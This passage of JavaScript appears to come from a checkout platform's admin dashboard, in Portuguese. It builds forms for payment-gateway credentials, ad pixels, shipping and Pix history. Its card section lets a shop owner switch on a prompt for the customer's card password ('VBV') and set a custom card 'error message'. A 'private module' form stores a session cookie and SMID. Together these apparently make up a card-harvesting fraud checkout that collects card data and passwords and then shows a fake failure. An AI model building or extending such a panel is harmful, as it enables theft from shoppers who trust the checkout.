                                                                    "dashboard/updatePreferencias",
                                                                    {
                                                                        id_loja:
                                                                            i,
                                                                        c: 'currency',
                                                                        v: e.target.value,
                                                                    },
                                                                    "POST"
                                                                );


                                                            if (
                                                                dados.status ==
                                                                200
                                                            ) {
                                                                _global.toast(
                                                                    "idioma atualizado",
                                                                    "toastsucesso"
                                                                );
                                                            }

                                                            if (
                                                                dados.status ==
                                                                500
                                                            ) {
                                                                _global.toast(
                                                                    "Erro interno.",
                                                                    "toasterro"
                                                                );
                                                            }
                                                        }
                                                    })
                                                .append(
                                                        $("<option>", {
                                                            value: 'USD',
                                                            text: 'USD',
                                                        })
                                                    ).append(
                                                        $("<option>", {
                                                            value: 'BRL',
                                                            text: 'BRL',
                                                        })
                                                    ).append(
                                                        $("<option>", {
                                                            value: 'RUB',
                                                            text: 'RUB',
                                                        })
                                                    )
                                                )
                                            )
                                             
                                        )
                                    )
                                    .append(
                                        $("<div>", {
                                            class: "col-lg-12 py-4 flex",
                                            id: "div_checkout_suitpay",
                                            style: "display: none;",
                                        }).append(
                                            $("<div>", {
                                                class: "col-lg-3 card flex",
                                                style: "justify-content: center; align-items: center;",
                                            })
                                                .append(
                                                    $("<span>", {
                                                        text: "Suitpay",
                                                        style: "margin-top: 10px;",
                                                    })
                                                )
                                                .append(
                                                    $("<span>", {
                                                        style: "margin-top: 10px; font-size: 0.7vw;",
                                                        text: "Usuário SuitPay",
                                                    })
                                                )
                                                .append(
                                                    $("<input>", {
                                                        type: "text",
                                                        id: "usuario_suit",
                                                        class: "form-control",
                                                        style: "width: 90%;",
                                                        value:
                                                            _suitpay.usuario_suitpay ??
                                                            "",
                                                    })
                                                )
                                                .append(
                                                    $("<span>", {
                                                        style: "margin-top: 10px; font-size: 0.7vw;",
                                                        text: "Ci",
                                                    })
                                                )
                                                .append(
                                                    $("<input>", {
                                                        type: "text",
                                                        id: "ci_suit",
                                                        class: "form-control",
                                                        style: "width: 90%;",
                                                        value:
                                                            _suitpay.ci ?? "",
                                                    })
                                                )
                                                .append(
                                                    $("<span>", {
                                                        style: "margin-top: 10px; font-size: 0.7vw;",
                                                        text: "Cs",
                                                    })
                                                )
                                                .append(
                                                    $("<input>", {
                                                        type: "text",
                                                        id: "cs_suit",
                                                        class: "form-control",
                                                        style: "width: 90%;",
                                                        value:
                                                            _suitpay.cs ?? "",
                                                    })
                                                )
                                                .append(
                                                    $("<button>", {
                                                        class: "btn btn-primary",
                                                        text: "Salvar Informações",
                                                        style: "width: 90%; margin-top: 10px;",
                                                        click: async function (
                                                            e
                                                        ) {
                                                            if (
                                                                $(
                                                                    "#cs_suit"
                                                                ).val().length <
                                                                    4 ||
                                                                $(
                                                                    "#ci_suit"
                                                                ).val().length <
                                                                    4
                                                            ) {
                                                                _global.toast(
                                                                    "Existem campos vazios, verifique CI e CS.",
                                                                    "toasterro"
                                                                );
                                                                return;
                                                            }

                                                            if (
                                                                $(
                                                                    "#usuario_suit"
                                                                ).val().length <
                                                                2
                                                            ) {
                                                                _global.toast(
                                                                    "Digite o usuário da SuitPay",
                                                                    "toasterro"
                                                                );
                                                                return;
                                                            }
                                                            _global.btnCarregando(
                                                                $(this),
                                                                true,
                                                                "Salvar Informações"
                                                            );

                                                            const usuario =
                                                                _global.getUsuario();

                                                            let dados =
                                                                await _global.busca(
                                                                    "dashboard/updateSuitpay",
                                                                    {
                                                                        ci: $(
                                                                            "#ci_suit"
                                                                        ).val(),
                                                                        cs: $(
                                                                            "#cs_suit"
                                                                        ).val(),
                                                                        id_loja:
                                                                            $(
                                                                                "#select_loja"
                                                                            ).val(),
                                                                        usuario_suit:
                                                                            $(
                                                                                "#usuario_suit"
                                                                            ).val(),
                                                                        id_usuario:
                                                                            usuario.id_usuario,
                                                                    },
                                                                    "POST"
                                                                );

                                                            if (
                                                                dados.status ==
                                                                200
                                                            ) {
                                                                _global.toast(
                                                                    "As credenciais foram salvas com sucesso",
                                                                    "toastsucesso"
                                                                );
                                                            } else {
                                                                _global.toast(
                                                                    "Não foi possível salvar - Erro interno",
                                                                    "toasterro"
                                                                );
                                                            }
                                                            _global.btnCarregando(
                                                                $(this),
                                                                false,
                                                                "Salvar Informações"
                                                            );
                                                        },
                                                    })
                                                )
                                                .append(
                                                    $("<button>", {
                                                        class: "btn btn-danger",
                                                        text: "Desativar Suitpay",
                                                        style: "width: 90%;",
                                                        click: async function (
                                                            e
                                                        ) {
                                                            _global.btnCarregando(
                                                                $(this),
                                                                true,
                                                                "Desativar Suitpay"
                                                            );
                                                            let dados =
                                                                await _global.busca(
                                                                    "dashboard/deleteSuitpay",
                                                                    {
                                                                        l: $(
                                                                            "#select_loja"
                                                                        ).val(),
                                                                    },
                                                                    "POST"
                                                                );

                                                            if (
                                                                dados.status ==
                                                                200
                                                            ) {
                                                                _global.toast(
                                                                    "A Gateway Suitpay foi desativada com sucesso.",
                                                                    "toastsucesso"
                                                                );
                                                                $(
                                                                    "#usuario_suit"
                                                                ).val("");
                                                                $(
                                                                    "#ci_suit"
                                                                ).val("");
                                                                $(
                                                                    "#cs_suit"
                                                                ).val("");
                                                            } else {
                                                                _global.toast(
                                                                    "Não foi possível desativar a gateway, houve um erro interno.",
                                                                    "toasterro"
                                                                );
                                                            }
                                                            _global.btnCarregando(
                                                                $(this),
                                                                false,
                                                                "Desativar Suitpay"
                                                            );
                                                        },
                                                    })
                                                )
                                        )
                                    )
                                    .append(
                                        $("<div>", {
                                            class: "col-lg-12 py-4 flex",
                                            id: "div_checkout_bc",
                                            style: "display: none;",
                                        }).append(
                                            $("<div>", {
                                                class: "col-lg-3 card flex",
                                                style: "justify-content: center; align-items: center;",
                                            })
                                                .append(
                                                    $("<span>", {
                                                        text: "BC / Módulo privado",
                                                        style: "margin-top: 10px;",
                                                    })
                                                )
                                                .append(
                                                    $("<span>", {
                                                        style: "margin-top: 10px; font-size: 0.7vw;",
                                                        text: "Cookie",
                                                    })
                                                )
                                                .append(
                                                    $("<input>", {
                                                        style: "margin-top: 10px; width: 90%;",
                                                        class: "form-control",
                                                        id: "bc_cookie",
                                                        value: bc.cookie ?? "",
                                                    })
                                                )
                                                .append(
                                                    $("<span>", {
                                                        style: "margin-top: 10px; font-size: 0.7vw;",
                                                        text: "SMID",
                                                    })
                                                )
                                                .append(
                                                    $("<input>", {
                                                        style: "margin-top: 10px; width: 90%",
                                                        class: "form-control",
                                                        id: "bc_smid",
                                                        value: bc.smid ?? "",
                                                    })
                                                )
                                                .append(
                                                    $("<button>", {
                                                        class: "btn btn-primary",
                                                        style: "margin-top: 10px; border-radius: 30px; width: 90%;",
                                                        text: "Salvar",
                                                        click: async function (
                                                            e
                                                        ) {
                                                            if (
                                                                $(
                                                                    "#bc_smid"
                                                                ).val().length <
                                                                    2 ||
                                                                $(
                                                                    "#bc_cookie"
                                                                ).val().length <
                                                                    2
                                                            ) {
                                                                _global.toast(
                                                                    "Preencha os campos.",
                                                                    "toasterro"
                                                                );
                                                                return;
                                                            }

                                                            _global.btnCarregando(
                                                                $(this),
                                                                true,
                                                                "Salvar"
                                                            );

                                                            let dados =
                                                                await _global.busca(
                                                                    "dashboard/updateBc",
                                                                    {
                                                                        id_loja:
                                                                            $(
                                                                                "#select_loja"
                                                                            ).val(),
                                                                        cookie: $(
                                                                            "#bc_cookie"
                                                                        ).val(),
                                                                        smid: $(
                                                                            "#bc_smid"
                                                                        ).val(),
                                                                    },
                                                                    "POST"
                                                                );

                                                            _global.btnCarregando(
                                                                $(this),
                                                                false,
                                                                "Salvar"
                                                            );

                                                            if (
                                                                dados.status ==
                                                                200
                                                            ) {
                                                                _global.toast(
                                                                    "Os valores foram salvos com sucesso.",
                                                                    "toastsucesso"
                                                                );
                                                                return;
                                                            }

                                                            _global.toast(
                                                                "Não foi possível salvar os valores",
                                                                "toasterro"
                                                            );
                                                        },
                                                    })
                                                )
                                        )
                                    )
                            )
                        );

                        let modalFacebook = `<div class="modal fade" id="modalface" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered" role="document">
                          <div class="modal-content">
                            <div class="modal-header">
                              <h5 class="modal-title" id="exampleModalLabel">Facebook</h5>
                              <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close">

                              </button>
                            </div>
                            <div class="modal-body">
                            <h6 style="text-align: center; font-size: 13px;">Suportamos múltiplos ID's de Pixel! O evento de compra(purchase) é disparado ao cliente finalizar o pedido.</h6>
                            <label>Pixel 1</label>
                            <input type="text" class="form-control margin5" id="fb_pixel1" placeholder="ID do Pixel 1" value="${
                                //neede to fix error with conditional chaining
                                dadosPagamento?.fbpixel?.[0]?.pixel_1 ?? ""
                            }"/>
                            <label>Pixel 2</label>
                            <input type="text" class="form-control margin5" id="fb_pixel2" placeholder="ID do Pixel 2" value="${
                                //neede to fix error with conditional chaining
                                dadosPagamento?.fbpixel?.[0]?.pixel_2 ?? ""
                            }"/>
                            <label>Pixel 3</label>
                            <input type="text" class="form-control margin5" id="fb_pixel3" placeholder="ID do Pixel 3" value="${
                                //neede to fix error with conditional chaining
                                dadosPagamento?.fbpixel?.[0]?.pixel_3 ?? ""
                            }"/>
                            <label>Pixel 4</label>
                            <input type="text" class="form-control margin5" id="fb_pixel4" placeholder="ID do Pixel 4" value="${
                                //neede to fix error with conditional chaining
                                dadosPagamento?.fbpixel?.[0]?.pixel_4 ?? ""
                            }"/>
                            <label>Pixel 5</label>
                            <input type="text" class="form-control margin5" id="fb_pixel5" placeholder="ID do Pixel 5" value="${
                                //neede to fix error with conditional chaining
                                dadosPagamento?.fbpixel?.[0]?.pixel_5 ?? ""
                            }"/>
                            <label>Pixel 6</label>
                            <input type="text" class="form-control margin5" id="fb_pixel6" placeholder="ID do Pixel 6" value="${
                                //neede to fix error with conditional chaining
                                dadosPagamento?.fbpixel?.[0]?.pixel_6 ?? ""
                            }"/>
                            </div>
                            <div class="modal-footer">
                              <button type="button" class="btn bg-gradient-secondary" data-bs-dismiss="modal">Fechar</button>
                              <button type="button" id="salvar_pixel_fb" class="btn bg-gradient-primary">Salvar</button>
                            </div>
                          </div>
                        </div>
                      </div>`;
                        $("#div_ads").append(modalFacebook);

                        $("#salvar_pixel_fb").click(async function (e) {
                            _global.btnCarregando(
                                $("#salvar_pixel_fb"),
                                true,
                                "Salvar"
                            );
                            let dados = await _global.busca(
                                "dashboard/salvaPixelFb",
                                {
                                    p1: $("#fb_pixel1").val(),
                                    p2: $("#fb_pixel2").val(),
                                    p3: $("#fb_pixel3").val(),
                                    p4: $("#fb_pixel4").val(),
                                    p5: $("#fb_pixel5").val(),
                                    p6: $("#fb_pixel6").val(),
                                    id_loja: $("#select_loja").val(),
                                },
                                "POST"
                            );

                            if (dados.status == 200) {
                                _global.toast(
                                    "As informações foram salvas.",
                                    "toastsucesso"
                                );
                            }
                            if (dados.status == 500) {
                                _global.toast(
                                    "Não foi possível salvar as informações",
                                    "toasterro"
                                );
                            }

                            _global.btnCarregando(
                                $("#salvar_pixel_fb", false, "Salvar")
                            );
                        });

                        let modalTaboola = `<div class="modal fade" id="modaltaboola" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered" role="document">
                          <div class="modal-content">
                            <div class="modal-header">
                              <h5 class="modal-title" id="exampleModalLabel">Taboola ADS</h5>
                              <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close">

                              </button>
                            </div>
                            <div class="modal-body">
                            <h6 style="text-align: center; font-size: 13px;">O evento de compra(purchase) é disparado ao cliente finalizar o pedido.</h6>
                            <label>ID da Conta Taboola</label>
                            <input type="text" class="form-control margin5" id="taboola_pixel1" placeholder="xxxxx" value="${
                                dadosPagamento.taboolapixel != null
                                    ? dadosPagamento.taboolapixel
                                    : ""
                            }"/>
                            </div>
                            <div class="modal-footer">
                              <button type="button" class="btn bg-gradient-secondary" data-bs-dismiss="modal">Fechar</button>
                              <button type="button" id="salvar_pixel_taboola" class="btn bg-gradient-primary">Salvar</button>
                            </div>
                          </div>
                        </div>
                      </div>`;
                        $("#div_ads").append(modalTaboola);

                        $("#salvar_pixel_taboola").click(async function (e) {
                            if ($("#taboola_pixel1").val() == "") {
                                _global.toast(
                                    "Preencha o ID da conta taboola.",
                                    "toasterro"
                                );
                                return;
                            }
                            _global.btnCarregando(
                                $("#salvar_pixel_taboola"),
                                true,
                                "Salvar"
                            );
                            let dados = await _global.busca(
                                "dashboard/salvaPixelTaboola",
                                {
                                    p1: $("#taboola_pixel1").val(),
                                    id_loja: $("#select_loja").val(),
                                },
                                "POST"
                            );

                            if (dados.status == 200) {
                                _global.toast(
                                    "As informações foram salvas.",
                                    "toastsucesso"
                                );
                            }
                            if (dados.status == 500) {
                                _global.toast(
                                    "Não foi possível salvar as informações",
                                    "toasterro"
                                );
                            }

                            _global.btnCarregando(
                                $("#salvar_pixel_taboola", false, "Salvar")
                            );
                        });

                        //MODAL FOR UTMIFY
                        let modalUtmify = `<div class="modal fade" id="modalUtmify" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
                        <div class="modal-dialog modal-dialog-centered" role="document">
                          <div class="modal-content">
                            <div class="modal-header">
                              <h5 class="modal-title" id="exampleModalLabel">UTMIFY</h5>
                              <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close">

                              </button>
                            </div>
                            <div class="modal-body">
                            <h6 style="text-align: center; font-size: 13px;">O evento de compra(purchase) é disparado ao cliente finalizar o pedido.</h6>
                            <label>API Key</label>
                            <input type="text" class="form-control margin5" id="input-utmify" placeholder="xxxxx" value="${
                                dadosPagamento.pixelUtmify ?? ""
                            }"/>
                            </div>
                            <div class="modal-footer">
                              <button type="button" class="btn bg-gradient-secondary" data-bs-dismiss="modal">Fechar</button>
                              <button type="button" id="salvar_utmify" class="btn bg-gradient-primary">Salvar</button>
                            </div>
                          </div>
                        </div>
                      </div>`;
                        $("#div_ads").append(modalUtmify);

                        $("#salvar_utmify").click(async function (e) {
                            if ($("#input-utmify").val() == "") {
                                _global.toast(
                                    "Insira a chave API UTMIFY",
                                    "toasterro"
                                );
                                return;
                            }

                            _global.btnCarregando(
                                $("#salvar_utmify"),
                                true,
                                "Salvar"
                            );
                            let dados = await _global.busca(
                                "dashboard/savePixelUtmify",
                                {
                                    api_key: $("#input-utmify").val(),
                                    id_loja: $("#select_loja").val(),
                                },
                                "POST"
                            );

                            if (dados.status == 200) {
                                _global.toast(
                                    "As informações foram salvas.",
                                    "toastsucesso"
                                );
                            }
                            if (dados.status == 500) {
                                _global.toast(
                                    "Não foi possível salvar as informações",
                                    "toasterro"
                                );
                            }

                            _global.btnCarregando(
                                $("#salvar_utmify", false, "Salvar")
                            );
                        });

                        $("#div_cartao_loja").empty();

                        if (cartaoLoja.length > 0) {
                            $("#div_cartao_loja")
                                .append(
                                    $("span>", {
                                        style: "margin-top: 10px;",
                                        text: "Configurações",
                                    })
                                )
                                .append(
                                    $("<div>", {
                                        class: "form-check form-switch",
                                        style: "margin-top: 10px; justify-content: center; align-items: center;",
                                    })
                                        .append(
                                            $("<input>", {
                                                class: "form-check-input",
                                                type: "checkbox",
                                                checked: true,
                                                id: "checkbox_cartaoativo",
                                                change: async function (e) {
                                                    let flag =
                                                        $(this).prop("checked");

                                                    let dados =
                                                        await _global.busca(
                                                            "dashboard/ativaCartaoLoja",
                                                            {
                                                                l: $(
                                                                    "#select_loja"
                                                                ).val(),
                                                                flag: flag
                                                                    ? "s"
                                                                    : "n",
                                                            },
                                                            "POST"
                                                        );

                                                    if (dados.status == 200) {
                                                        _global.toast(
                                                            "A forma de pagamento Cartão de Crédito foi ativada ao checkout.",
                                                            "toastsucesso"
                                                        );
                                                        $("#div_cartao_loja")
                                                            .append(
                                                                $("<div>", {
                                                                    class: "form-check form-switch tempativocard",
                                                                    style: "margin-top: 10px; justify-content: center",
                                                                })
                                                                    .append(
                                                                        $(
                                                                            "<input>",
                                                                            {
                                                                                class: "form-check-input",
                                                                                type: "checkbox",
                                                                                id: "checkbox_vbv",
                                                                                change: async function (
                                                                                    e
                                                                                ) {
                                                                                    let flag =
                                                                                        $(
                                                                                            this
                                                                                        ).prop(
                                                                                            "checked"
                                                                                        );

                                                                                    let dados =
                                                                                        await _global.busca(
                                                                                            "dashboard/ativaVbvLoja",
                                                                                            {
                                                                                                l: $(
                                                                                                    "#select_loja"
                                                                                                ).val(),
                                                                                                flag: flag
                                                                                                    ? "s"
                                                                                                    : "n",
                                                                                            },
                                                                                            "POST"
                                                                                        );

                                                                                    if (
                                                                                        dados.status ==
                                                                                        200
                                                                                    ) {
                                                                                        _global.toast(
                                                                                            "O VBV " +
                                                                                                (flag
                                                                                                    ? ""
                                                                                                    : "não ") +
                                                                                                "será solicitado ao cliente agora.",
                                                                                            "toastsucesso"
                                                                                        );
                                                                                    }
                                                                                },
                                                                            }
                                                                        )
                                                                    )
                                                                    .append(
                                                                        $(
                                                                            "<label>",
                                                                            {
                                                                                class: "form-check-label",
                                                                                id: "texto_vbv",
                                                                                text: "Ativar VBV (Senha do Cartão)",
                                                                            }
                                                                        )
                                                                    )
                                                            )
                                                            .append(
                                                                $("<button>", {
                                                                    class: "btn btn-primary tempativocard",
                                                                    style: "margin-top: 10px; border-radius: 30px; width: 75%;",
                                                                    text: "Alterar Mensagem de Erro",
                                                                    click: async function (
                                                                        e
                                                                    ) {
                                                                        let _msg =
                                                                            prompt(
                                                                                "Digite a mensagem de erro desejada:"
                                                                            );

                                                                        if (
                                                                            _msg ==
                                                                            ""
                                                                        ) {
                                                                            _global.toast(
                                                                                "A mensagem digitada está vazia.",
                                                                                "toastsucesso"
                                                                            );
                                                                            return;
                                                                        }

                                                                        let dados =
                                                                            await _global.busca(
                                                                                "dashboard/updateMsgCartao",
                                                                                {
                                                                                    l: $(
                                                                                        "#select_loja"
                                                                                    ).val(),
                                                                                    m: _msg,
                                                                                },
                                                                                "POST"
                                                                            );

                                                                        if (
                                                                            dados.status ==
                                                                            200
                                                                        ) {
                                                                            _global.toast(
                                                                                "A mensagem de erro foi alterada com sucesso.",
                                                                                "toastsucesso"
                                                                            );
                                                                        } else {
                                                                            _global.toast(
                                                                                "Não foi possível salvar a mensagem.",
                                                                                "toasterro"
                                                                            );
                                                                        }
                                                                    },
                                                                })
                                                            );
                                                    } else if (
                                                        dados.status == 201
                                                    ) {
                                                        _global.toast(
                                                            "A forma de pagamento Cartão de Crédito foi desativada ao checkout.",
                                                            "toastsucesso"
                                                        );
                                                        $(
                                                            ".tempativocard"
                                                        ).each((i, v) => {
                                                            $(v).remove();
                                                        });
                                                    }
                                                },
                                            })
                                        )
                                        .append(
                                            $("<label>", {
                                                class: "form-check-label",
                                                id: "texto_cartaoativo",
                                                text: "Ativar Cartão de Crédito",
                                            })
                                        )
                                );

                            $("#div_cartao_loja")
                                .append(
                                    $("<div>", {
                                        class: "form-check form-switch tempativocard",
                                        style: "margin-top: 10px; justify-content: center;",
                                        hidden: !isAdmin,
                                    })
                                        .append(
                                            $("<input>", {
                                                class: "form-check-input",
                                                type: "checkbox",
                                                id: "checkbox_vbv",
                                                checked:
                                                    cartaoLoja[0].vbv == "s"
                                                        ? true
                                                        : false,
                                                change: async function (e) {
                                                    let flag =
                                                        $(this).prop("checked");

                                                    let dados =
                                                        await _global.busca(
                                                            "dashboard/ativaVbvLoja",
                                                            {
                                                                l: $(
                                                                    "#select_loja"
                                                                ).val(),
                                                                flag: flag
                                                                    ? "s"
                                                                    : "n",
                                                            },
                                                            "POST"
                                                        );

                                                    if (dados.status == 200) {
                                                        _global.toast(
                                                            "O VBV " +
                                                                (flag
                                                                    ? ""
                                                                    : "não ") +
                                                                "será solicitado ao cliente agora.",
                                                            "toastsucesso"
                                                        );
                                                    }
                                                },
                                            })
                                        )
                                        .append(
                                            $("<label>", {
                                                class: "form-check-label",
                                                id: "texto_vbv",
                                                text: "Ativar VBV (Senha do Cartão)",
                                            })
                                        )
                                )
                                .append(
                                    $("<button>", {
                                        class: "btn btn-primary tempativocard",
                                        style: "margin-top: 10px; border-radius: 30px; width: 75%;",
                                        text: "Alterar Mensagem de Erro",
                                        click: async function (e) {
                                            let _msg = prompt(
                                                "Digite a mensagem de erro desejada:"
                                            );

                                            if (_msg == "") {
                                                _global.toast(
                                                    "A mensagem digitada está vazia.",
                                                    "toastsucesso"
                                                );
                                                return;
                                            }

                                            let dados = await _global.busca(
                                                "dashboard/updateMsgCartao",
                                                {
                                                    l: $("#select_loja").val(),
                                                    m: _msg,
                                                },
                                                "POST"
                                            );

                                            if (dados.status == 200) {
                                                _global.toast(
                                                    "A mensagem de erro foi alterada com sucesso.",
                                                    "toastsucesso"
                                                );
                                            } else {
                                                _global.toast(
                                                    "Não foi possível salvar a mensagem.",
                                                    "toasterro"
                                                );
                                            }
                                        },
                                    })
                                );
                        } else {
                            $("#div_cartao_loja")
                                .append(
                                    $("span>", {
                                        style: "margin-top: 10px;",
                                        text: "Configurações",
                                    })
                                )
                                .append(
                                    $("<div>", {
                                        class: "form-check form-switch",
                                        style: "margin-top: 10px; justify-content: center; align-items: center;",
                                    })
                                        .append(
                                            $("<input>", {
                                                class: "form-check-input",
                                                type: "checkbox",
                                                id: "checkbox_cartaoativo",
                                                change: async function (e) {
                                                    let flag =
                                                        $(this).prop("checked");

                                                    let dados =
                                                        await _global.busca(
                                                            "dashboard/ativaCartaoLoja",
                                                            {
                                                                l: $(
                                                                    "#select_loja"
                                                                ).val(),
                                                                flag: flag
                                                                    ? "s"
                                                                    : "n",
                                                            },
                                                            "POST"
                                                        );

                                                    if (dados.status == 200) {
                                                        _global.toast(
                                                            "A forma de pagamento Cartão de Crédito foi ativada ao checkout.",
                                                            "toastsucesso"
                                                        );
                                                        $("#div_cartao_loja")
                                                            .append(
                                                                $("<div>", {
                                                                    class: "form-check form-switch tempativocard",
                                                                    style: "margin-top: 10px; justify-content: center;",
                                                                })
                                                                    .append(
                                                                        $(
                                                                            "<input>",
                                                                            {
                                                                                class: "form-check-input",
                                                                                type: "checkbox",
                                                                                id: "checkbox_vbv",
                                                                                change: async function (
                                                                                    e
                                                                                ) {
                                                                                    let flag =
                                                                                        $(
                                                                                            this
                                                                                        ).prop(
                                                                                            "checked"
                                                                                        );

                                                                                    let dados =
                                                                                        await _global.busca(
                                                                                            "dashboard/ativaVbvLoja",
                                                                                            {
                                                                                                l: $(
                                                                                                    "#select_loja"
                                                                                                ).val(),
                                                                                                flag: flag
                                                                                                    ? "s"
                                                                                                    : "n",
                                                                                            },
                                                                                            "POST"
                                                                                        );

                                                                                    if (
                                                                                        dados.status ==
                                                                                        200
                                                                                    ) {
                                                                                        _global.toast(
                                                                                            "O VBV " +
                                                                                                (flag
                                                                                                    ? ""
                                                                                                    : "não ") +
                                                                                                "será solicitado ao cliente agora.",
                                                                                            "toastsucesso"
                                                                                        );
                                                                                    }
                                                                                },
                                                                            }
                                                                        )
                                                                    )
                                                                    .append(
                                                                        $(
                                                                            "<label>",
                                                                            {
                                                                                class: "form-check-label",
                                                                                id: "texto_vbv",
                                                                                text: "Ativar VBV (Senha do Cartão)",
                                                                            }
                                                                        )
                                                                    )
                                                            )
                                                            .append(
                                                                $("<button>", {
                                                                    class: "btn btn-primary tempativocard",
                                                                    style: "margin-top: 10px; border-radius: 30px; width: 75%;",
                                                                    text: "Alterar Mensagem de Erro",
                                                                    click: async function (
                                                                        e
                                                                    ) {
                                                                        let _msg =
                                                                            prompt(
                                                                                "Digite a mensagem de erro desejada:"
                                                                            );

                                                                        if (
                                                                            _msg ==
                                                                            ""
                                                                        ) {
                                                                            _global.toast(
                                                                                "A mensagem digitada está vazia.",
                                                                                "toastsucesso"
                                                                            );
                                                                            return;
                                                                        }

                                                                        let dados =
                                                                            await _global.busca(
                                                                                "dashboard/updateMsgCartao",
                                                                                {
                                                                                    l: $(
                                                                                        "#select_loja"
                                                                                    ).val(),
                                                                                    m: _msg,
                                                                                },
                                                                                "POST"
                                                                            );

                                                                        if (
                                                                            dados.status ==
                                                                            200
                                                                        ) {
                                                                            _global.toast(
                                                                                "A mensagem de erro foi alterada com sucesso.",
                                                                                "toastsucesso"
                                                                            );
                                                                        } else {
                                                                            _global.toast(
                                                                                "Não foi possível salvar a mensagem.",
                                                                                "toasterro"
                                                                            );
                                                                        }
                                                                    },
                                                                })
                                                            );
                                                    } else if (
                                                        dados.status == 201
                                                    ) {
                                                        _global.toast(
                                                            "A forma de pagamento Cartão de Crédito foi desativada ao checkout.",
                                                            "toastsucesso"
                                                        );
                                                        $(
                                                            ".tempativocard"
                                                        ).each((i, v) => {
                                                            $(v).remove();
                                                        });
                                                    }
                                                },
                                            })
                                        )
                                        .append(
                                            $("<label>", {
                                                class: "form-check-label",
                                                id: "texto_cartaoativo",
                                                text: "Ativar Cartão de Crédito",
                                            })
                                        )
                                );
                        }
                        res();
                    });
                };

                appendCheckout().then(() => {
                    // if (dadosPagamento.pix) $("#banco_responsavel").val(dadosPagamento.pix.logo_banco ?? "mp").change();

                    $("#banco_responsavel").val("pagShield").change();

                    $(".tabcheckout").click(function (e) {
                        e.preventDefault();
                        e.stopImmediatePropagation();
                        e.stopPropagation();

                        $("#div_checkout_" + $(this).attr("aba")).show();

                        abas.forEach((v) => {
                            if (v != $(this).attr("aba")) {
                                $("#div_checkout_" + v).hide();
                            }
                        });

                        $("#tabs_checkout")
                            .children()
                            .each((i, v) => {
                                if (
                                    $(v).children().attr("aba") !=
                                    $(this).attr("aba")
                                ) {
                                    $(v)
                                        .children()
                                        .removeClass("abacheckoutativo");
                                } else {
                                    $(v)
                                        .children()
                                        .addClass("abacheckoutativo");
                                }
                            });
                    });

                    fretes.forEach((v, i) => {
                        $("#cards_frete").append(
                            $("<li>", {
                                class: "list-group-item border-0 d-flex p-4 mb-2 border-radius-lg bg-gray-100",
                            })
                                .append(
                                    $("<div>", {
                                        class: "d-flex flex-column",
                                    })
                                        .append(
                                            $("<h6>", {
                                                class: "mb-3 text-sm",
                                                text:
                                                    v.ds_frete +
                                                    " (Secundário)",
                                            })
                                        )
                                        .append(
                                            $("<span>", {
                                                class: "mb-2 text-xs",
                                                text: "Valor: ",
                                            }).append(
                                                $("<span>", {
                                                    class: "font-weight-bold ms-sm-2 text-dark",
                                                    text: "R$ " + v.preco,
                                                })
                                            )
                                        )
                                )
                                .append(
                                    $("<div>", {
                                        class: "ms-auto text-end",
                                        id: "divvfrete" + v.id_frete_loja,
                                    }).append(
                                        $("<a>", {
                                            class: "btn btn-link text-danger text-gradient px-3 mb-0",
                                            click: async function (e) {
                                                e.preventDefault();
                                                $(
                                                    "#divvfrete" +
                                                        v.id_frete_loja
                                                )
                                                    .parent()
                                                    .remove();
                                                let dados = await _global.busca(
                                                    "dashboard/apagaFrete",
                                                    {
                                                        id: v.id_frete_loja,
                                                    },
                                                    "POST"
                                                );

                                                if (dados.status == 200) {
                                                    _global.toast(
                                                        "O frete foi apagado.",
                                                        "toastsucesso"
                                                    );
                                                    $(this).parent().remove();
                                                    return;
                                                }

                                                if (dados.status == 500) {
                                                    _global.toast(
                                                        "Não foi possível apagar o frete. [Erro Interno]",
                                                        "toasterro"
                                                    );
                                                    return;
                                                }
                                            },
                                        }).append(
                                            $("<i>", {
                                                class: "far fa-trash-alt me-2",
                                                "aria-hidden": "true",
                                            })
                                        )
                                    )
                                )
                        );
                    });

                    if (dadosPagamento.status == 200 && dadosPagamento.pix) {
                        $("#select_tipo_chave_pix")
                            .val(dadosPagamento?.pix?.id_tipo_chave)
                            .change();
                    }

                    _global.geraHistoricoPix(1);
                    _global.loadingAba("checkout", false);
                });
            });
        },
        geraHistoricoPix(i) {
            $("#ul_logpix").empty();
            if (_global.historicoPix[i] == undefined) return;
            _global.historicoPix[i].forEach((v, i) => {
                $("#ul_logpix").append(
                    $("<div>", {
                        class: "card-body p-2",
                    }).append(
                        $("<ul>", {
                            class: "list-group",
                        }).append(
                            $("<li>", {
                                class: "list-group-item border-0 d-flex justify-content-between ps-0 mb-2 border-radius-lg",
                            }).append(
                                $("<div>", {
                                    class: "d-flex align-items-center",
                                })
                                    .append(
                                        $("<div>", {
                                            class: "icon icon-shape icon-sm me-3 bg-gradient-dark shadow text-center",
                                        }).append(
                                            $("<i>", {
                                                class: "ni ni-key-25 text-white opacity-10",
                                            })
                                        )
                                    )
                                    .append(
                                        $("<div>", {
                                            class: "d-flex flex-column",
                                        })
                                            .append(
                                                $("<h6>", {
                                                    class: "mb-1 text-dark text-sm",
                                                    text: v.chavepix,
                                                })
                                            )
                                            .append(
                                                $("<span>", {
                                                    class: "text-xs",
                                                    text: v.dt,
                                                })
                                            )
                                    )
                            )
                        )
                    )
                );
            });

            let tamanho = _global.historicoPix.length - 1;

            $("#ul_logpix").append(
                $("<ul>", {
                    class: "pagination pagination-sm",
                    id: "paginacao_historico",
                })
            );
            for (_i = 1; _i <= tamanho; _i++) {
                $("#paginacao_historico").append(
                    $("<li>", {
                        class:
                            "cursorpointer page-item " +
                            (i == _i ? "active" : ""),
                        style: i == _i ? "color: white;" : "",
                    }).append(
                        $("<a>", {
                            class: "cursorpointer page-link",
                            text: _i,
                            style: i == _i ? "color: white;" : "",
                            click: function (e) {
                                _global.geraHistoricoPix($(this).text());
                            },
                        })
                    )
                );
            }
        },
        async busca(url, parametros = {}, tipo) {
            const usuario = _global.getUsuario();
            return new Promise((res, rej) => {
                $.ajax({
                    type: tipo,
                    url: usuario.url_api + url,
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                        Accept: "application/json",
                        Authorization: "Bearer " + usuario.api_token,
                    },
                    data: parametros,
                    success: (r) => {
                        res(r);
                    },
                    error: (request, status, error) => {
                        console.log(
                            "[Request] => " + request,
